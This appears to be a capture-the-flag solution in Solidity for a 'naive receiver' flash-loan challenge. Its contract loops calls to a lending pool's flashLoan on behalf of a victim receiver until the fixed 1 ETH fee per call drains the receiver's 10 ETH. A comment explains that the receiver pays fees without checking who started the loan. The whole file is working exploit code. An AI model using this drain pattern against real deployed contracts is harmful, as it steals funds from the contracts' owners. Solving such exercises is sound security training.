// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";
import "hardhat/console.sol";


contract RemoveETH {

    constructor (
        FlashLoanReceiver receiver,
        NaiveReceiverLenderPool pool
    ) { // The receiver has 10 ETH balance; receiver's onFlashloan func pays at least 1 ETH fee to the pool on every call
        // without doing any arbitrage before returning funds to pool (amount + fee)
        while (address(receiver).balance >= 1 ether) 
            pool.flashLoan(receiver, pool.ETH(), 0, "");
    }
}